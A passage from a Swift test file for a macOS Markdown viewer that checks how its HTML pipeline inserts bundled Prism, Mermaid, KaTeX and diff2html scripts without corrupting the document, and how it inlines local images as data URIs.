// WebPreviewView.swift (AppKit). The </body> corruption bug was invisible to all
// prior tests because it lived exactly here.
// =============================================================================

print("\n=== Full-Pipeline Injection Tests ===")

runner.test("HTMLPipeline.loadFromBundle() loads all 4 JS bundles") {
    let pipeline = HTMLPipeline.loadFromBundle()
    try expect(pipeline.prismJS != nil && !pipeline.prismJS!.isEmpty, "Prism.js not loaded")
    try expect(pipeline.mermaidJS != nil && !pipeline.mermaidJS!.isEmpty, "Mermaid.js not loaded")
    try expect(pipeline.katexJS != nil && !pipeline.katexJS!.isEmpty, "KaTeX.js not loaded")
    try expect(pipeline.katexAutoRenderJS != nil && !pipeline.katexAutoRenderJS!.isEmpty, "KaTeX auto-render not loaded")
}

runner.test("assembled HTML: real </body> closing tag is last HTML element") {
    // mermaid.min.js (via DOMPurify) contains "</body>" and "</html>" as JS string literals,
    // so the assembled document will have >1 occurrence of each — that is expected and correct.
    // The invariant is: the document ends with </body>...</html>, with those tags in the right order.
    let pipeline = HTMLPipeline.loadFromBundle()
    let body = MarkdownRenderer.renderHTML(from: "# Test\n\nHello world.")
    let wrapped = MarkdownRenderer.wrapInTemplate(body)
    let assembled = pipeline.assemble(wrapped)
    // The document must end with </html> (ignoring whitespace)
    let trimmed = assembled.trimmingCharacters(in: .whitespacesAndNewlines)
    try expect(trimmed.hasSuffix("</html>"), "Assembled HTML must end with </html>")
    // The final </body> must appear before the final </html>
    guard let lastBodyRange = assembled.range(of: "</body>", options: .backwards),
          let lastHtmlRange = assembled.range(of: "</html>", options: .backwards) else {
        throw TestError.assertionFailed("Assembled HTML missing </body> or </html>")
    }
    try expect(lastBodyRange.lowerBound < lastHtmlRange.lowerBound,
        "Final </body> must precede final </html> — document structure is broken")
}

runner.test("assembled HTML: document ends with </body></html> in correct order") {
    let pipeline = HTMLPipeline.loadFromBundle()
    let body = MarkdownRenderer.renderHTML(from: "# Test")
    let assembled = pipeline.assemble(MarkdownRenderer.wrapInTemplate(body))
    // The closing sequence must be: ...scripts... </body> </html>
    // (Mermaid JS contains </body> inside a string literal, so we use the last </body>)
    guard let lastBodyRange = assembled.range(of: "</body>", options: .backwards),
          let lastHtmlRange = assembled.range(of: "</html>", options: .backwards) else {
        throw TestError.assertionFailed("Assembled HTML missing </body> or </html>")
    }
    try expect(lastBodyRange.lowerBound < lastHtmlRange.lowerBound,
        "Final </body> must come before </html> in assembled document")
}

runner.test("assembled HTML: all scripts are after </article>") {
    let pipeline = HTMLPipeline.loadFromBundle()
    let body = MarkdownRenderer.renderHTML(from: "# Test\n\n```mermaid\ngraph TD; A-->B;\n```")
    let assembled = pipeline.assemble(MarkdownRenderer.wrapInTemplate(body))
    guard let articleEnd = assembled.range(of: "</article>"),
          let firstScript = assembled.range(of: "<script>") else {
        throw TestError.assertionFailed("Missing </article> or <script> in assembled HTML")
    }
    try expect(firstScript.lowerBound >= articleEnd.upperBound,
        "Script injection appears before </article> — JS source may leak into article content")
}

runner.test("assembled HTML: no <script> tag inside <article> content") {
    let pipeline = HTMLPipeline.loadFromBundle()
    let md = try loadFixture("golden-corpus.md")
    let body = MarkdownRenderer.renderHTML(from: md)
    let assembled = pipeline.assemble(MarkdownRenderer.wrapInTemplate(body))
    guard let articleStart = assembled.range(of: "<article", options: .literal),
          let articleEnd = assembled.range(of: "</article>", options: .literal) else {
        throw TestError.assertionFailed("No <article> element in assembled HTML")
    }
    let articleContent = String(assembled[articleStart.lowerBound..<articleEnd.upperBound])
    try expect(!articleContent.contains("<script"), "<script> tag found inside <article> — injection is leaking into content area")
}

runner.test("assembled HTML: no JS source text leaking into article (DOMPurify regression)") {
    let pipeline = HTMLPipeline.loadFromBundle()
    // Mermaid content triggers Mermaid.js injection — exactly the failure scenario from Apr 4 2026
    let md = "# Test\n\n```mermaid\ngraph TD; A-->B;\n```\n\nSome text after the diagram."
    let body = MarkdownRenderer.renderHTML(from: md)
    let assembled = pipeline.assemble(MarkdownRenderer.wrapInTemplate(body))
    guard let articleStart = assembled.range(of: "<article"),
          let articleEnd = assembled.range(of: "</article>") else {
        throw TestError.assertionFailed("No <article> in assembled HTML")
    }
    let articleHTML = String(assembled[articleStart.lowerBound..<articleEnd.upperBound])
    // Strip HTML tags to get text content
    let textContent = articleHTML.replacingOccurrences(of: "<[^>]+>", with: "", options: .regularExpression)
    // If JS source leaked into article, we'd see these patterns in the visible text
    let jsLeakPatterns = ["function(", "var ", "const ", "let ", ".prototype.", "document.querySelector", "createElement"]
    for pattern in jsLeakPatterns {
        try expect(!textContent.contains(pattern),
            "JS source pattern '\(pattern)' found in article text content — injection corruption detected. This is exactly the DOMPurify </body> bug.")
    }
}

runner.test("HTMLPipeline.insertBeforeBodyClose: replaces only the final </body>") {
    let pipeline = HTMLPipeline(prismJS: nil, mermaidJS: nil, katexJS: nil, katexAutoRenderJS: nil)
    // Simulate the mermaid.min.js scenario: JS content that contains </body> as a string literal
    let htmlWithBodyInScript = """
    <html><body>
    <script>var x = "</body></html>"; console.log(x);</script>
    </body></html>
    """
    let result = pipeline.insertBeforeBodyClose("<script>new</script>", into: htmlWithBodyInScript)
    let bodyCount = result.components(separatedBy: "</body>").count - 1
    // The </body> inside the script string should NOT be replaced; only the actual closing tag
    try expect(bodyCount == 2, "Expected 2 </body> occurrences: 1 inside script string + 1 real closing tag. Got \(bodyCount). Forward replacingOccurrences would have produced 3.")
    // insertBeforeBodyClose replaces the last </body> tag, injecting the script just before it.
    // Input ends with "</body></html>" so result ends with "<script>new</script>\n</body></html>"
    try expect(result.contains("<script>new</script>\n</body>"), "Insertion should be just before the final </body>")
}

runner.test("HTMLPipeline: injectMermaid does not corrupt HTML when Mermaid contains </body>") {
    let pipeline = HTMLPipeline.loadFromBundle()
    guard let mermaidJS = pipeline.mermaidJS else {
        throw TestError.assertionFailed("mermaid.min.js not loaded")
    }
    let hasDangerousContent = mermaidJS.contains("</body>")
    // mermaid.min.js (via DOMPurify) contains "</body>" as a JS string literal, so the
    // assembled HTML will have >1 occurrence of "</body>". The correctness invariant is:
    // (a) the document ends with </body> followed by </html>, and
    // (b) </body> count equals 1 (real) + however many are in the injected JS source.
    let body = MarkdownRenderer.renderHTML(from: "# Mermaid test\n```mermaid\ngraph TD; A-->B;\n```")
    let assembled = pipeline.assemble(MarkdownRenderer.wrapInTemplate(body))
    let bodyLiteralCount = mermaidJS.components(separatedBy: "</body>").count - 1
    let totalBodyCount = assembled.components(separatedBy: "</body>").count - 1
    let expectedCount = 1 + bodyLiteralCount  // 1 real + N from Mermaid JS source
    try expect(totalBodyCount == expectedCount,
        "After Mermaid injection (mermaid.min.js \(hasDangerousContent ? "DOES" : "does NOT") contain </body> \(bodyLiteralCount)x): expected \(expectedCount) total </body> occurrences (1 real + \(bodyLiteralCount) in JS source), got \(totalBodyCount)")
    // The final </body> must come before </html> — document structure is correct
    guard let lastBodyRange = assembled.range(of: "</body>", options: .backwards),
          let lastHtmlRange = assembled.range(of: "</html>", options: .backwards) else {
        throw TestError.assertionFailed("Assembled HTML missing </body> or </html> after Mermaid injection")
    }
    try expect(lastBodyRange.lowerBound < lastHtmlRange.lowerBound,
        "Final </body> must precede </html> — Mermaid injection corrupted document structure")
}

runner.test("HTMLPipeline: full-pipeline golden snapshot — structure stable across versions") {
    let pipeline = HTMLPipeline.loadFromBundle()
    let md = """
    # Pipeline Test

    Math: $E = mc^2$

    ```swift
    let x = 1
    ```

    > [!NOTE]
    > Alert callout

    ```mermaid
    graph TD; A-->B;
    ```
    """
    let body = MarkdownRenderer.renderHTML(from: md)
    let assembled = pipeline.assemble(MarkdownRenderer.wrapInTemplate(body))
    // Structural invariants that must hold regardless of JS bundle versions
    try expect(assembled.contains("<h1"), "Missing h1")
    try expect(assembled.contains("E = mc"), "Math content not preserved")
    try expect(assembled.contains("language-swift"), "Swift code block missing")
    try expect(assembled.contains("[!NOTE]"), "Alert callout not preserved (JS transforms client-side)")
    try expect(assembled.contains("language-mermaid"), "Mermaid block missing")
    try expect(assembled.contains("Prism.highlightAll"), "Prism script not injected")
    try expect(assembled.contains("mermaid.initialize") || assembled.contains("mermaid.run"), "Mermaid script not injected")
    try expect(assembled.contains("renderMathInElement"), "KaTeX script not injected")
    // Ordering: article content comes first, scripts come after
    let articlePos = assembled.range(of: "E = mc")!.lowerBound
    let prismPos = assembled.range(of: "Prism.highlightAll")!.lowerBound
    try expect(articlePos <= prismPos, "Article content should come before injected scripts")
}

// =============================================================================
// HTMLPipeline.inlineLocalImages — regression tests
// These tests would have caught the golden-corpus image path bug:
// fixture used repo-root-relative paths but baseDirectory was the fixture's dir.
// =============================================================================

runner.test("inlineLocalImages: skips http/https/data/file/absolute sources") {
    let html = """
    <img src="https://example.com/a.png">
    <img src="http://example.com/b.png">
    <img src="data:image/png;base64,abc">
    <img src="file:///tmp/c.png">
    <img src="/abs/path/d.png">
    """
    let result = HTMLPipeline.inlineLocalImages(in: html, baseDirectory: URL(fileURLWithPath: "/tmp"))
    try expect(result == html, "Should not modify non-relative sources")
}

runner.test("inlineLocalImages: inlines existing relative image as data URI") {
    // Write a tiny 1x1 PNG to a temp file, verify it gets inlined
    let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("markview-test-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: tmpDir) }
    // Minimal valid 1x1 transparent PNG (67 bytes)
    let png1x1 = Data([
        0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,
        0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x08,0x06,0x00,0x00,0x00,0x1F,0x15,0xC4,
        0x89,0x00,0x00,0x00,0x0A,0x49,0x44,0x41,0x54,0x78,0x9C,0x62,0x00,0x01,0x00,0x00,
        0x05,0x00,0x01,0x0D,0x0A,0x2D,0xB4,0x00,0x00,0x00,0x00,0x49,0x45,0x4E,0x44,0xAE,
        0x42,0x60,0x82
    ])
    let imgURL = tmpDir.appendingPathComponent("test.png")
    try png1x1.write(to: imgURL)
    let html = #"<img src="test.png">"#
    let result = HTMLPipeline.inlineLocalImages(in: html, baseDirectory: tmpDir)
    try expect(result.contains("data:image/png;base64,"), "PNG should be inlined as data URI")
    try expect(!result.contains("src=\"test.png\""), "Original relative src should be replaced")
}

runner.test("inlineLocalImages: silently skips missing relative image") {
    let html = #"<img src="nonexistent.png">"#
    let result = HTMLPipeline.inlineLocalImages(in: html, baseDirectory: URL(fileURLWithPath: "/tmp"))
    try expect(result == html, "Should return HTML unchanged when image not found")
}

runner.test("inlineLocalImages: resolves ../ relative paths (golden-corpus regression)") {
    // Simulate the golden-corpus setup: fixture at Tests/TestRunner/Fixtures/,
    // images at docs/screenshots/ — path in markdown: ../../../docs/screenshots/img.png
    let tmpRoot = FileManager.default.temporaryDirectory.appendingPathComponent("markview-gc-\(UUID().uuidString)")
    let fixturesDir = tmpRoot.appendingPathComponent("Tests/TestRunner/Fixtures")
    let docsDir = tmpRoot.appendingPathComponent("docs/screenshots")
    try FileManager.default.createDirectory(at: fixturesDir, withIntermediateDirectories: true)
    try FileManager.default.createDirectory(at: docsDir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: tmpRoot) }
    let png1x1 = Data([
        0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,
        0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x08,0x06,0x00,0x00,0x00,0x1F,0x15,0xC4,
        0x89,0x00,0x00,0x00,0x0A,0x49,0x44,0x41,0x54,0x78,0x9C,0x62,0x00,0x01,0x00,0x00,
        0x05,0x00,0x01,0x0D,0x0A,0x2D,0xB4,0x00,0x00,0x00,0x00,0x49,0x45,0x4E,0x44,0xAE,
        0x42,0x60,0x82
    ])
    try png1x1.write(to: docsDir.appendingPathComponent("preview-only.png"))
    let html = #"<img src="../../../docs/screenshots/preview-only.png">"#
    let result = HTMLPipeline.inlineLocalImages(in: html, baseDirectory: fixturesDir)
    try expect(result.contains("data:image/png;base64,"),
        "../../../ relative path should resolve and inline the image (golden-corpus regression)")
}

// =============================================================================

// =============================================================================
// MARK: - diff2html Injection Tests
// =============================================================================
// Unit tests for HTMLPipeline.hasDiffBlocks (pure function) and
// HTMLPipeline.injectDiff2HTML (conditional injection).
// These run in SPM test context where diff2html-bundle.min.js may not be
// present — see injectDiff2HTML notes on nil-guard behaviour.
// =============================================================================

print("\n=== diff2html Injection Tests ===")

runner.test("hasDiffBlocks — true for language-diff block") {
    let html = #"<pre><code class="language-diff">diff content</code></pre>"#
    try expect(HTMLPipeline.hasDiffBlocks(html) == true,
        "hasDiffBlocks must return true when HTML contains class=\"language-diff\"")
}

runner.test("hasDiffBlocks — false for non-diff language block") {
    let html = #"<pre><code class="language-swift">let x = 1</code></pre>"#
    try expect(HTMLPipeline.hasDiffBlocks(html) == false,
        "hasDiffBlocks must return false for non-diff language class")
}

runner.test("hasDiffBlocks — false for empty string") {
    try expect(HTMLPipeline.hasDiffBlocks("") == false,
        "hasDiffBlocks must return false for empty input")
}

runner.test("injectDiff2HTML — injects d2h markers when diff blocks present") {
    // loadFromBundle() may not find diff2html-bundle.min.js in the SPM test environment
    // (the resource file may not exist yet). If diff2htmlJS is nil the method returns input
    // unchanged — that is the documented behaviour and is covered by the nil-guard test below.
    // When the bundle IS present, injection should add recognisable diff2html markers.
    let pipeline = HTMLPipeline.loadFromBundle()
    let input = """
    <html><body>
    <pre><code class="language-diff">--- a/f\n+++ b/f\n@@ -1 +1 @@\n-old\n+new</code></pre>
    </body></html>
    """
    let result = pipeline.injectDiff2HTML(input)
    if pipeline.diff2htmlJS != nil {
        // Bundle present: injection must have happened
        let injected = result.contains("diff2html") || result.contains("d2h-wrapper") || result.contains("__diff2htmlCSS")
        try expect(injected,
            "injectDiff2HTML must inject diff2html markers when diff2htmlJS is loaded and diff blocks are present")
    } else {
        // Bundle absent (CI / fresh checkout): method must return input unchanged
        try expect(result == input,
            "injectDiff2HTML must return input unchanged when diff2htmlJS is nil")
    }
}

runner.test("injectDiff2HTML — skips injection when no diff blocks present") {
    let pipeline = HTMLPipeline.loadFromBundle()
    let input = """
    <html><body>
    <pre><code class="language-swift">let x = 1</code></pre>
    </body></html>
    """
    let result = pipeline.injectDiff2HTML(input)
    // hasDiffBlocks returns false → method must return input unchanged regardless of bundle
    try expect(result == input,
        "injectDiff2HTML must return input unchanged when no language-diff blocks are present")
}

runner.test("injectDiff2HTML — preserves non-diff code blocks unchanged") {
    let pipeline = HTMLPipeline.loadFromBundle()
    let swiftBlock = #"<pre><code class="language-swift">func hello() {}</code></pre>"#
    let input = """
    <html><body>
    \(swiftBlock)
    <pre><code class="language-diff">--- a/f\n+++ b/f\n@@ -1 +1 @@\n-old\n+new</code></pre>
    </body></html>
    """
    let result = pipeline.injectDiff2HTML(input)
    // The swift code block must survive unchanged regardless of whether injection ran
    try expect(result.contains(#"class="language-swift""#),
        "injectDiff2HTML must preserve non-diff code blocks (language-swift class must remain)")
    try expect(result.contains("func hello()"),
        "injectDiff2HTML must preserve non-diff code block content")
}

runner.test("diff.md fixture renders through full pipeline — well-formed HTML") {
    let md = try loadFixture("diff.md")
    let bodyHTML = MarkdownRenderer.renderHTML(from: md)
    let wrapped = MarkdownRenderer.wrapInTemplate(bodyHTML)
    let pipeline = HTMLPipeline.loadFromBundle()
    let assembled = pipeline.assemble(wrapped)
    try expect(assembled.contains("<html"),   "Assembled diff.md must contain <html>")
    try expect(assembled.contains("<body"),   "Assembled diff.md must contain <body>")
    try expect(assembled.contains("</html>"), "Assembled diff.md must contain </html>")
}

runner.test("diff.md fixture renders through full pipeline — diff block parsed by cmark-gfm") {
    let md = try loadFixture("diff.md")
    let bodyHTML = MarkdownRenderer.renderHTML(from: md)
    // cmark-gfm must output class="language-diff" for fenced ```diff blocks
    try expect(bodyHTML.contains("language-diff"),
        "cmark-gfm must produce class=\"language-diff\" for fenced diff blocks in diff.md")
}

// =============================================================================

print("")
runner.summary()
exit(runner.failed > 0 ? 1 : 0)
